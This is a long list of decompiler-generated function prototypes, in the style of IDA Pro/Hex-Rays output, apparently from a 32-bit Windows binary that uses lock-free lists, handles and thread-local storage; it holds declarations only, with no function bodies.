char __thiscall sub_4513C0(_DWORD *this);
bool __thiscall sub_4513DC(unsigned int *this, _DWORD *a2);
_DWORD *__thiscall sub_451410(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__stdcall sub_45143A(_DWORD *a1, int a2, int a3, int a4);
char __thiscall sub_45144B(_DWORD *this, _DWORD *a2);
char __thiscall sub_45146D(int this, struct _SINGLE_LIST_ENTRY *a2);
DWORD sub_4514F5();
BOOL sub_451509();
void __thiscall sub_451522(_DWORD *this, signed __int64 a2);
int __thiscall sub_4516D8(int this);
int __thiscall sub_45174E(int this);
signed __int32 __thiscall sub_4517EB(volatile signed __int32 *this);
signed __int32 __thiscall sub_451803(volatile signed __int32 *this, volatile signed __int32 *a2);
char __thiscall sub_451821(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6);
int __thiscall sub_45188E(void **this, void *a2);
signed __int32 __thiscall sub_4518C5(int this);
signed __int32 __thiscall sub_4518D5(volatile signed __int32 *this);
int __thiscall sub_451945(volatile signed __int32 *this);
void __thiscall sub_451964(volatile signed __int32 *this, HANDLE hSourceHandle);
signed __int32 __thiscall sub_451A0B(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_451A23(int this, struct _SINGLE_LIST_ENTRY *a2);
int __thiscall sub_451A65(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_451A84(int this, struct _SINGLE_LIST_ENTRY *a2, char a3);
PSLIST_ENTRY __thiscall sub_451ACE(int this, int a2);
PSLIST_ENTRY __thiscall sub_451B1E(union _SLIST_HEADER *this);
BOOL __thiscall sub_451B88(HANDLE *this, LONG lReleaseCount);
int __thiscall sub_451BA6(int *this, int a2);
char __thiscall sub_451BD8(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_451CD1(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
int __thiscall sub_451DCA(int *this);
_DWORD *__thiscall sub_451DF2(_DWORD *this);
_DWORD *__thiscall sub_451E16(int this);
void __thiscall sub_451E4A(int this, int a2);
char __thiscall sub_451E86(union _SLIST_HEADER *this, int a2);
char __thiscall sub_451E9E(_DWORD *this);
int __thiscall sub_451EAC(_DWORD *this, int a2, unsigned int a3);
signed __int32 __thiscall sub_451F9C(volatile signed __int32 *this);
char *__cdecl sub_451FE3(char *ListEntry);
LPVOID sub_452024();
char __thiscall sub_452040(volatile signed __int32 *this);
int __thiscall sub_452062(_DWORD *this, int a2, int a3);
int __thiscall sub_4520B3(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
void __thiscall sub_4520F0(_DWORD *this, int a2);
int __cdecl sub_452115(int *a1, int a2);
int __cdecl sub_452146(int *a1, int a2);
char __thiscall sub_452180(unsigned int *this, int a2, int a3, int a4, int a5, int a6);
char __thiscall sub_4521A6(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7);
char *sub_4521FB();
union _SLIST_HEADER *__thiscall sub_452251(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
int __thiscall sub_45238D(volatile signed __int32 *this);
char __thiscall sub_452429(_DWORD *this);
char __stdcall sub_45253F(int a1, _DWORD *a2, int a3);
char __stdcall sub_45254E(_DWORD *a1, int a2);
void __stdcall Callback(_DWORD *a1, BOOLEAN a2);
int __thiscall sub_452598(_DWORD *this, int a2);
int __cdecl sub_45262F(char a1, char a2, int a3);
int __stdcall sub_45269A(char a1, unsigned __int8 a2, int a3);
int __thiscall sub_4526C4(int this, _DWORD *a2);
int __thiscall sub_4526F9(_DWORD *this);
int __thiscall sub_452727(_DWORD *this, int a2);
unsigned int __thiscall sub_45276F(_DWORD *this);
char __thiscall sub_4527A1(volatile signed __int32 *this, int a2);
int __thiscall sub_452855(int this, char a2);
void __thiscall sub_4528B2(int *this);
int __thiscall sub_452901(int *this, _DWORD *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
char *__thiscall sub_452958(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
char *__thiscall sub_4529A6(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
char *__thiscall sub_4529D2(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
_DWORD *__thiscall sub_452A0F(_DWORD *this, int a2);
_DWORD *__thiscall sub_452A2C(_DWORD *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
_DWORD *__thiscall sub_452A5A(_DWORD *this);
void *__thiscall sub_452A73(void *this, int a2, char a3);
void __thiscall sub_452B49(void **this);
void __thiscall sub_452B60(void **this);
void __thiscall sub_452B77(int this);
void __thiscall sub_452BB3(_DWORD *this);
void __thiscall sub_452BBA(void *this);
void __thiscall sub_452BE8(void **this);
void __thiscall sub_452BFF(void *this);
bool __thiscall sub_452C38(_DWORD *this, _DWORD *a2);
int __thiscall sub_452C5B(_DWORD *this, int a2);
_DWORD *__thiscall sub_452C8D(_DWORD *Block, char a2);
void *__thiscall sub_452CB0(void *Block, char a2);
void **__thiscall sub_452CD5(void **Block, char a2);
volatile signed __int32 *__thiscall sub_452D01(_DWORD *this, signed __int32 a2);
void __thiscall sub_452E5D(volatile signed __int32 *this, int a2, char a3);
int __thiscall sub_452E87(int *this, _DWORD *a2);
void __thiscall sub_452EB6(int this, _DWORD *a2);
void __thiscall sub_452EEA(int this, signed __int32 a2);
signed __int32 __thiscall sub_452F51(volatile signed __int32 *this, signed __int32 a2);
void __thiscall sub_452F81(int this, int a2);
char __cdecl sub_453076(int a1);
char __thiscall sub_453082(int *this, _DWORD *a2);
int __thiscall sub_4530C9(int this);
void __thiscall sub_453104(int *this);
BOOL sub_453143();
int __thiscall sub_453153(int this);
void **__stdcall sub_4531D6(_DWORD *a1);
int __thiscall sub_4531F8(int this);
char __thiscall sub_453213(int *this);
int __thiscall sub_453355(_DWORD *this);
int __thiscall sub_45335D(_DWORD *this);
int __thiscall sub_453368(_DWORD *this);
int __thiscall sub_453370(_DWORD *this);
char __thiscall sub_45337B(unsigned int *this, _DWORD *a2, _DWORD *a3);
_DWORD *__thiscall sub_4533BD(_DWORD *this, int a2);
int __thiscall sub_453405(_DWORD *this);
int __thiscall sub_453419(_DWORD *this);
int __thiscall sub_45341D(_DWORD *this);
int __thiscall sub_45342E(_DWORD *this);
bool __thiscall sub_453456(_DWORD *this, int a2, int a3);
int __thiscall sub_453532(int this, int a2);
int __thiscall sub_453555(int *this, int *a2);
int __thiscall sub_453586(__int32 *this);
void *__thiscall sub_4535D7(_DWORD *this);
BOOL __thiscall sub_4535F5(_DWORD *lpTlsValue, int a2);
char __thiscall sub_453610(int this);
void __thiscall sub_453693(volatile signed __int32 *this);
char __thiscall sub_453698(int *this);
_DWORD *__thiscall sub_4536EF(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_45373D(_DWORD *this, _DWORD **a2);
char __thiscall sub_45376B(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
void __thiscall sub_45385C(int this, _DWORD **a2);
void __thiscall sub_453890(void *this, int a2);
BOOL __thiscall sub_4538A6(LPVOID lpTlsValue);
void __cdecl sub_4538B5(void **Block);
int sub_4538D4(void); // weak
// void __usercall sub_4538D9(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_45395B(volatile __int32 **this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_453967(void *this);
int __cdecl sub_453A00(char a1, char a2, int a3, int a4);
int __stdcall sub_453A71(char a1, unsigned __int8 a2, int a3, int a4);
int __thiscall sub_453A9E(__int32 *this, int a2);
int __thiscall sub_453B01(_DWORD *this, int a2);
int __thiscall sub_453B10(_DWORD *this);
int __thiscall sub_453B24(int this, int a2, int a3, int a4);
char *__thiscall sub_453B4F(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
volatile __int32 *__thiscall sub_453B7B(volatile __int32 *this, int a2, char a3);
char *__thiscall sub_453C5C(char *this, int a2);
void __thiscall sub_453C77(_DWORD *this);
void __thiscall sub_453C97(void **this);
void __thiscall sub_453CA7(int this);
_DWORD *__thiscall sub_453D80(_DWORD *Block, char a2);
char *__thiscall sub_453DA2(char *Block, char a2);
_DWORD *__thiscall sub_453DC4(unsigned int *this, int a2, int a3);
_DWORD *__thiscall sub_453DE7(unsigned int *this, int a2);
int __thiscall sub_453E47(_DWORD *this);
void __thiscall sub_453E5E(int this, char a2);
int __thiscall sub_453F8D(void *this, volatile __int32 **a2);
volatile __int32 *__thiscall sub_453FD5(_DWORD *this);
void __thiscall sub_454056(int this);
void __thiscall sub_4540A6(volatile __int32 *this, int a2, int a3);
void __stdcall sub_454145(int a1, int a2);
void __thiscall sub_454164(volatile signed __int32 *this, int a2);
void __thiscall sub_454208(int this, int a2, char a3);
bool __cdecl sub_454298(int a1, _DWORD *a2);
signed __int32 __thiscall sub_4542AB(int this);
int __thiscall sub_4542D9(int this);
void __thiscall sub_4542ED(_DWORD ***this, int a2);
char *__thiscall sub_4543F5(char *this);
char __thiscall sub_4543F9(int this);
_DWORD *__thiscall sub_454444(_DWORD *this);
bool __thiscall sub_45445A(_DWORD *this);
bool __thiscall sub_45446C(_DWORD *this);
bool __thiscall sub_45447E(_DWORD *this);
bool __thiscall sub_454489(_DWORD *this);
void __thiscall sub_454491(int this, int a2);
int __thiscall sub_4544E0(_DWORD *this);
int __thiscall sub_4544E4(void *this, int a2, int a3, int a4);
void __thiscall sub_454521(volatile signed __int32 *Block);
void __thiscall sub_45455B(int this, int a2);
char __thiscall sub_454656(volatile signed __int32 *this, int a2);
char __cdecl sub_454690(int a1, int a2);
bool __thiscall sub_4546A9(_DWORD *this, char a2);
_DWORD *__cdecl sub_4546FD(_DWORD *a1, unsigned int a2, char a3);
_DWORD *__thiscall sub_45471B(_DWORD *this, const void **a2);
char *__thiscall sub_454742(char *this, int a2);
char *__thiscall sub_45475D(char *this, int a2);
char *__thiscall sub_454778(char *this, int a2);
void __thiscall sub_454793(void **this);
void **__thiscall sub_45479F(void **this, const void **a2);
int __thiscall sub_4547B8(_DWORD *this, unsigned int a2);
bool __cdecl sub_4547EE(unsigned int a1, unsigned int a2);
_DWORD *__thiscall sub_45480C(_DWORD *this, unsigned int a2, int *a3);
_DWORD *__thiscall sub_4548F5(void *this);
char *__cdecl sub_45493D(unsigned int a1);
bool __cdecl sub_454954(int a1, int a2);
int __thiscall sub_454A34(int *this);
_DWORD *__thiscall sub_454A6E(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_454ACC(_DWORD *this, int a2, _DWORD *a3);
int __thiscall sub_454B1A(_DWORD *this);
void __thiscall sub_454B2C(DWORD_PTR *Block);
int __thiscall sub_454B94(_DWORD *this);
int __thiscall sub_454B98(_DWORD *this);
int __thiscall sub_454B9C(_DWORD *lpTlsValue);
void __thiscall sub_454C64(DWORD_PTR *this, int a2);
BOOL __thiscall sub_454CC3(int this);
BOOL __thiscall sub_454CDF(_DWORD *lpTlsValue);
double __cdecl sub_454D02(double a1);
int __thiscall sub_454D3A(int this, int a2, unsigned int a3, int a4);
int __thiscall sub_454DC7(double *this, double a2, int a3);
double __stdcall sub_454DEA(unsigned int a1, unsigned int a2, int a3, int a4);
double __thiscall sub_454E25(char *this, int a2, int a3);
double __thiscall sub_454EE0(int this);
unsigned int __thiscall sub_454F17(int this, int a2);
unsigned int __thiscall sub_454F5C(unsigned int *this);
char *__thiscall sub_454FA2(char *this, int a2);
BOOL __thiscall sub_454FCD(_BYTE *this);
bool __stdcall sub_454FE6(int a1);
double __thiscall sub_455016(double *this);
unsigned int __thiscall sub_455036(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_4550A8(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5);
double __thiscall sub_455268(double *this);
char *__thiscall sub_4552B4(char *this, int a2, int a3, _DWORD *a4);
void __thiscall sub_45550A(char *this);
void __thiscall sub_455567(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_455632(int this, int a2);
int __thiscall sub_455680(_DWORD *this, int a2);
int __thiscall sub_4556B9(_DWORD *this, int a2);
void __thiscall sub_4556C8(int this, int a2, unsigned int a3);
unsigned int __thiscall sub_455776(_DWORD *this, unsigned int a2);
int __thiscall sub_4557E6(void *this, int a2);
void __thiscall sub_455842(_DWORD *this);
_DWORD *__thiscall sub_45590B(void *this, _DWORD *a2, int a3);
int __thiscall sub_455952(char *this, int a2);
_DWORD *__thiscall sub_455A10(void *this, _DWORD *a2, int a3);
unsigned int __thiscall sub_455A48(_DWORD *this, int a2);
char __thiscall sub_455A92(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_455B0B(char *Block);
void __thiscall sub_455B26(int this, _DWORD *Block);
int __thiscall sub_455BBF(int this, int a2);
int __thiscall sub_455C4E(_DWORD *this);
LPVOID __thiscall sub_455C6B(_DWORD *this);
_DWORD *__thiscall sub_455C88(_DWORD *this, int a2);
_DWORD *__thiscall sub_455CD8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_455D26(int this, unsigned int a2, int a3, char a4);
unsigned __int32 __thiscall sub_45602B(_DWORD *this, int a2);
char __thiscall sub_456079(_DWORD *this, int a2, int a3, char a4);
_DWORD *__thiscall sub_4560FA(_DWORD *this);
int __thiscall sub_4561AC(_DWORD *this, int a2);
void __thiscall sub_4561E2(_DWORD *this, int a2, int a3);
void __thiscall sub_4562C8(_DWORD *this, _DWORD *Block);
_DWORD *__thiscall sub_4562F4(_DWORD *this, char a2);
void __thiscall sub_456307(int this, int a2, char a3);
int __thiscall sub_4563D5(_DWORD *this);
_DWORD *__thiscall sub_4563DF(_DWORD *this);
char __thiscall sub_4563E9(_DWORD *this, int a2, int a3);
int __stdcall sub_456425(int a1);
__int32 sub_45646E();
int __cdecl sub_45651B(int a1);
int sub_45653D();
union _SLIST_HEADER *__thiscall sub_456558(union _SLIST_HEADER *this, int a2);
_DWORD *__thiscall sub_456597(_DWORD *this, int a2, int a3);
int __thiscall sub_4565CC(int this, int a2);
char *__thiscall sub_4565F6(char *this);
void __thiscall sub_45662A(_DWORD *this);
void __thiscall sub_456631(_DWORD *this);
_DWORD *__thiscall sub_4566A8(_DWORD *Block, char a2);
_DWORD *__thiscall sub_4566CB(_DWORD *Block, char a2);
_DWORD *__thiscall sub_4566F3(_DWORD *Block, char a2);
_DWORD *__thiscall sub_456716(_DWORD *Block, char a2);
_DWORD *__thiscall sub_456739(void *this, int a2);
int __cdecl sub_45676E(int a1);
int __thiscall sub_4567A3(char *this);
int __stdcall sub_4567EB(_DWORD *a1, int nPriority);
PSLIST_ENTRY __thiscall sub_456803(char *this, struct _SINGLE_LIST_ENTRY *a2);
void __thiscall sub_456864(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2);
signed __int32 __thiscall sub_456907(volatile signed __int32 *this);
signed __int32 __thiscall sub_456911(volatile signed __int32 *this);
int __thiscall sub_45693E(union _SLIST_HEADER *this, unsigned int a2, int a3);
BOOL __stdcall sub_4569C0(_DWORD *a1);
PSLIST_ENTRY __thiscall sub_4569CF(union _SLIST_HEADER *this);
int __thiscall sub_456A3B(int this);
void sub_456A5C();
int *__thiscall sub_456A78(int *this);
DWORD __stdcall sub_456B72(int a1, int a2, int a3, int a4);
int __thiscall sub_456C38(_DWORD *this, int a2, int a3);
char __thiscall sub_456C75(_DWORD *this, int a2, int a3);
int __thiscall sub_456CB2(_DWORD *this, int a2);
int __thiscall sub_456CEF(void **this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_456D33(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_456D6C(_DWORD *this, int a2, int a3);
__int32 sub_456DA2();
void sub_456E11();
int __cdecl sub_456E54(int (__thiscall ***a1)(_DWORD, int));
_DWORD *__thiscall sub_456E76(_DWORD *this, int a2);
// void *__thiscall unknown_libname_90(void *); idb
_DWORD *__thiscall sub_456EF4(_DWORD *this);
void __thiscall sub_456F54(void *this);
void *__thiscall sub_456FB4(void *Block, char a2);
bool __thiscall sub_456FD9(_DWORD *this, unsigned int a2);
int __thiscall sub_45700E(_DWORD *this, int a2);
bool __thiscall sub_457057(int this);
char __cdecl sub_4570AA(int a1);
char __thiscall sub_4570B6(__int32 this, __int32 *a2, int a3, char a4);
signed __int32 __thiscall sub_457144(_DWORD *this, int a2);
int __thiscall sub_457169(_DWORD **this, int a2);
int __thiscall sub_45718B(_DWORD **this, int a2);
char __thiscall sub_4571AD(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4);
char __thiscall sub_45723E(int this, struct _SINGLE_LIST_ENTRY *a2);
PSLIST_ENTRY __thiscall sub_457269(_DWORD *this);
int __thiscall sub_45727F(unsigned int *this, int a2);
int __thiscall sub_45729D(int this, int a2, int a3);
signed __int32 __thiscall sub_45741A(_DWORD *this, unsigned int a2);
signed __int32 __thiscall sub_45745A(_DWORD *this, unsigned int a2);
int __thiscall sub_45749E(int this, __int32 a2, char a3);
char __thiscall sub_45750E(_BYTE *this);
signed __int32 __thiscall sub_4575CA(int this);
int __thiscall sub_4575FD(_DWORD *this);
char __thiscall sub_45764B(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_45773F(int **this);
char __thiscall sub_45789C(int this);
volatile signed __int32 *__thiscall sub_4578B0(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_4578EA(_DWORD *this, unsigned int a2);
int __thiscall sub_457932(_DWORD *this, unsigned int a2);
char __thiscall sub_45797A(void *this, _DWORD *a2, int a3);
int __cdecl sub_457A16(char a1, char a2, int a3, int a4);
int __stdcall sub_457A91(char a1, unsigned __int8 a2, int a3, int a4);
char __thiscall sub_457ABE(int this, char a2, char a3);
int __thiscall sub_457B1C(_DWORD *this);
char *__thiscall sub_457B39(char *this, int a2, int a3, int *a4);
void __thiscall sub_457BB6(PSLIST_HEADER ListHead);
void __thiscall sub_457C59(int this);
volatile signed __int32 *__thiscall sub_457C82(_DWORD *this, signed __int32 a2);
signed __int32 __thiscall sub_457DDE(_DWORD *this, int a2, char a3);
char __thiscall sub_457EE6(_DWORD *this);
int __thiscall sub_457F3A(_DWORD *this, int a2);
int __thiscall sub_457F77(_DWORD *this, _DWORD *a2);
char __thiscall sub_457FD1(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
int *__thiscall sub_458041(int *this, int *a2);
__int32 __thiscall sub_458075(int *this, char a2);
__int32 __thiscall sub_4580B8(int *this, char a2);
void __thiscall sub_458136(_DWORD *this);
void __thiscall sub_45814B(_DWORD *this);
int *__thiscall sub_45819D(_DWORD *this);
int *__thiscall sub_4581B6(_DWORD *this, int a2);
char __thiscall sub_458206(int *this, _DWORD *a2);
void __thiscall sub_458230(int *this, int a2);
int __cdecl sub_458267(int a1);
int *__cdecl sub_4582B8(int a1);
_DWORD *__thiscall sub_4582F1(_DWORD *this, int a2);
char *__thiscall sub_458368(char *this, int a2);
char *__thiscall sub_458383(char *this, int a2);
char *__thiscall sub_45839E(char *this, int a2);
char *__thiscall sub_4583B9(char *this, int a2);
void __thiscall sub_4583D4(_DWORD *this);
int sub_458420();
char *__thiscall sub_458456(_DWORD *this, char a2);
int __thiscall sub_458483(_DWORD *this, int a2, int a3, int a4, int a5);
int *__thiscall sub_4585FD(_DWORD **this, int a2);
int __thiscall sub_458651(int this);
char __thiscall sub_458789(int this);
void __thiscall sub_4587FB(_DWORD *this);
int __thiscall sub_458813(_DWORD *this);
BOOL __thiscall sub_45882E(int this, int a2);
char __thiscall sub_4589BF(int *this, _DWORD *a2);
char __thiscall sub_4589FC(int this);
int __thiscall sub_458A6A(_DWORD *this, bool *a2, bool *a3);
int __thiscall sub_458B94(_DWORD **this, int a2);
signed __int32 __thiscall sub_458BC0(volatile signed __int32 *this, signed __int32 a2);
int __thiscall sub_458BEE(_DWORD *this);
int __thiscall sub_458BF6(_DWORD *this);
int __thiscall sub_458BFD(_DWORD **this);
int __thiscall sub_458C16(_DWORD *this);
void __thiscall sub_458C45(int *this, int a2, int a3, int a4);
bool __thiscall sub_458DBD(_DWORD *this);
char __thiscall sub_458DC5(int this);
int __thiscall sub_458E23(int this);
char __thiscall sub_458F28(int this, char a2);
int __thiscall sub_458FAE(int this, int a2, int a3, char a4);
int __thiscall sub_459001(int this, int a2);
void __thiscall sub_459018(int *this, int a2);
void __thiscall sub_459059(_DWORD *this);
int __thiscall sub_4590C2(struct _SINGLE_LIST_ENTRY *this);
void __thiscall sub_4590E1(int this);
int __thiscall sub_459104(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4);
int __thiscall sub_45912C(_DWORD *this, int a2);
char __thiscall sub_45915F(_DWORD *this);
char __cdecl sub_45918A(_DWORD *a1, int a2);
int __thiscall sub_4591B7(int this);
void __thiscall sub_459278(_DWORD *this, int a2, char a3);
char __thiscall sub_4592C3(struct _SINGLE_LIST_ENTRY *this, int a2);
int __thiscall sub_4593FA(int this, int a2, int a3);
int __fastcall sub_459546(int a1);
int __thiscall sub_459609(_DWORD *this);
char __thiscall sub_459709(int this, int a2);
int __thiscall sub_459765(struct _SINGLE_LIST_ENTRY *this);
union _SLIST_HEADER *__thiscall sub_4598ED(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3);
void __thiscall sub_459976(PSLIST_HEADER ListHead);
void __thiscall sub_459A19(union _SLIST_HEADER *this);
volatile __int32 *__thiscall sub_459A31(volatile __int32 *this);
char __cdecl sub_459A72(int a1);
char __thiscall sub_459A7E(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_459B72(char *this, int a2);
int *__thiscall sub_459BA1(int *this, int a2, int a3, char a4, unsigned int a5);
int __thiscall sub_459C18(int this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_459C71(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_459D32(_DWORD *this, int a2, int a3, unsigned int a4, int a5);
void __thiscall sub_459D9E(PSLIST_HEADER ListHead);
void __thiscall sub_459E44(PSLIST_HEADER ListHead);
void __thiscall sub_459EC0(int this);
void __thiscall sub_459F24(signed __int32 this);
void **__thiscall sub_459F72(void **this, void **a2);
void *__thiscall sub_459F9C(void *Block, char a2);
volatile signed __int32 *__thiscall sub_459FC1(_DWORD *this, _DWORD *a2);
volatile signed __int32 *__thiscall sub_45A11C(_DWORD *this, signed __int32 a2);
int __thiscall sub_45A27B(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
char __cdecl sub_45A392(int a1);
signed __int32 __thiscall sub_45A39E(_DWORD *this, int a2, signed __int32 a3);
int __thiscall sub_45A3C3(char *this, _DWORD *a2, int a3);
void __thiscall sub_45A474(_DWORD *this);
char __thiscall sub_45A4EA(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_45A5AC(int *this);
volatile signed __int32 *__thiscall sub_45A5E0(_DWORD *this, int a2);
int __thiscall sub_45A61F(int this, int a2);
_DWORD *__thiscall sub_45A65A(char *this, _DWORD *a2, int a3);
struct _SINGLE_LIST_ENTRY *__thiscall sub_45A6AE(union _SLIST_HEADER *this);
int __thiscall sub_45A713(_DWORD *this, int a2, char a3);
int __thiscall sub_45A746(int *this);
_DWORD *__thiscall sub_45A756(int *this, int a2);
bool __thiscall sub_45A7A0(_DWORD *this);
bool __thiscall sub_45A7A8(void *this);
int __thiscall sub_45A7B3(_DWORD *this, int a2);
int __thiscall sub_45A7DC(int *this, _DWORD *a2);
int __thiscall sub_45A7EF(int this, int a2, int a3, _DWORD *a4);
bool __thiscall sub_45A871(_DWORD *this);
_DWORD *__thiscall sub_45A886(int *this, unsigned int a2, char a3);
int __thiscall sub_45A8CE(int this, int *a2, char a3);
struct _SINGLE_LIST_ENTRY *__thiscall sub_45A9AA(int this);
int __thiscall sub_45AA03(int this);
volatile signed __int32 *__thiscall sub_45AA36(_DWORD *this, int a2);
PSLIST_ENTRY __thiscall sub_45AA4F(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2);
char __thiscall sub_45AA75(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_45AB66(int this);
char __thiscall sub_45AB89(_DWORD *this);
signed __int32 __thiscall sub_45ABC8(union _SLIST_HEADER *this, int a2);
char __thiscall sub_45ABEF(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2);
int __thiscall sub_45AC31(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
int __thiscall sub_45AC61(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_45AC89(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_45ADBD(int this, unsigned int a2);
_BYTE *__thiscall sub_45ADE3(int this, char a2);
_DWORD *__thiscall sub_45AF8E(int *this, _DWORD *a2, int a3);
int __thiscall sub_45AFDA(void *this, int a2);
_DWORD *__thiscall sub_45AFE9(int this, _DWORD *a2, int a3);
int __thiscall sub_45B038(int this, int a2);
volatile signed __int32 *__thiscall sub_45B076(_DWORD *this, int a2);
_DWORD *__thiscall sub_45B0AE(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5);
_DWORD *__thiscall sub_45B0E6(void *this, _DWORD *a2, int a3);
int __thiscall sub_45B0FE(int *this);
void __thiscall sub_45B131(_DWORD *this, int *a2);
signed __int32 __thiscall sub_45B16F(_DWORD *this, int a2, signed __int32 a3);
_DWORD *__thiscall sub_45B195(int this, int a2, int a3);
int __thiscall sub_45B1C4(int this, int a2, char a3);
_DWORD *__thiscall sub_45B22D(_DWORD *this, int a2, char a3);
void __thiscall sub_45B2C6(_DWORD *this);
_DWORD *__thiscall sub_45B30B(_DWORD *Block, char a2);
int *__thiscall sub_45B330(_DWORD *this, int a2);
DWORD __thiscall sub_45B351(int this);
int __thiscall sub_45B3A7(int this);
void __thiscall sub_45B3FF(_DWORD *this, int a2);
PSLIST_ENTRY __thiscall sub_45B424(_DWORD *this);
int sub_45B441();
HMODULE __stdcall sub_45B445(int a1, int a2, int a3, int a4);
int __stdcall sub_45B467(PVOID a1, int a2); // idb
bool __thiscall sub_45B48A(_DWORD *this);
int __thiscall sub_45B492(_DWORD *this, char a2);
DWORD __thiscall sub_45B4C7(int this, char a2);
int __thiscall sub_45B5A0(int this);
int __thiscall sub_45B5C2(void *this);
signed __int32 __thiscall sub_45B5DA(int this);
BOOL __thiscall sub_45B662(int this);
_DWORD *__thiscall sub_45B69D(_DWORD *this, int a2);
HANDLE *__thiscall sub_45B6C3(HANDLE *this, const void **a2);
void __thiscall sub_45B6F4(char *this);
_DWORD *__thiscall sub_45B708(_DWORD *this, char a2);
char *__thiscall sub_45B74A(char *Block, char a2);
int __thiscall sub_45B76F(void *this, int a2, unsigned int a3);
HANDLE *__cdecl sub_45B77B(const void **a1);
_DWORD *__fastcall sub_45B7AE(int a1);
_DWORD *__stdcall sub_45B7EC(int a1, int a2);
char *__thiscall sub_45B824(char *this);
int __thiscall sub_45B828(_DWORD *this);
_DWORD *__thiscall sub_45B841(const void **this, _DWORD *a2);
_DWORD *__thiscall sub_45B856(const void **this, _DWORD *a2);
int __thiscall sub_45B85E(_DWORD *this, int a2, unsigned int a3);
union _SLIST_HEADER *__thiscall sub_45B86A(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
DWORD sub_45B876();
BOOL sub_45B8B8();
signed __int32 __thiscall sub_45B8CC(volatile signed __int32 *this, int a2);
int __thiscall sub_45B8F2(_DWORD *this, unsigned int *a2);
char __thiscall sub_45B91A(volatile signed __int32 *this);
signed __int32 __thiscall sub_45B942(volatile signed __int32 *this);
void __thiscall sub_45B9A0(_DWORD *this);
_DWORD *__thiscall sub_45BA07(_DWORD *this, int a2);
_DWORD *__thiscall sub_45BA76(_DWORD *this);
int __thiscall sub_45BAC0(int this, int a2);
int __thiscall sub_45BAE4(volatile __int32 *this);
int __thiscall sub_45BB1E(int this, int a2);
volatile signed __int32 *__cdecl sub_45BB42(int a1);
signed __int32 __cdecl sub_45BB53(int a1);
__int32 __thiscall sub_45BB64(volatile __int32 *this, char a2);
int __thiscall sub_45BBA7(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_45BC5B(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
__int32 __thiscall sub_45BC67(volatile __int32 *this, char a2, char *a3);
__int32 __thiscall sub_45BCD5(int this, char a2, int a3);
__int32 __thiscall sub_45BD63(int this, char a2);
void __cdecl sub_45BE1F(int a1);
int __cdecl sub_45BE46(int (__thiscall ***a1)(_DWORD, int));
void __thiscall sub_45BE64(_DWORD *this, int a2);
void __thiscall sub_45BE7C(_DWORD *this, int a2);
